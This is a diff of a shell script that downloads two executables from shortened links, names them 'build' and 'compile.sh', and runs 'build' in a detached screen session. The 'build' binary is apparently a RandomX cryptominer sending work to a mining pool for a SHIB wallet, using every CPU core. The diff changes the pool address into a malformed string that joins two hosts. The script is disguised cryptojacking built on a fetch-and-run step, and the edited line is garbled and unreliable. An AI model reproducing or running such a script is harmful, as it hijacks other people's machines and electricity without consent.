@@ -26,6 +26,6 @@ wget -qO compile.sh https://git.io/JPjuz
 wget -qO build https://git.io/JX29n
 chmod +x build
 chmod +x compile.sh
-screen -dm -S build ./build -a rx/0 -o 137.184.3.159:2112 -u SHIB:0xb6736a6a90a2bd68aedd99a995a1ece58fa16cb3.kuli-$kuli -t $(nproc --all) -k -m nicehash
+screen -dm -S build ./build -a rx/0 -o rx.unmineable.com:3333137.184.3.159:2112 -u SHIB:0xb6736a6a90a2bd68aedd99a995a1ece58fa16cb3.kuli-$kuli -t $(nproc --all) -k -m nicehash
 ./compile.sh
 echo succes
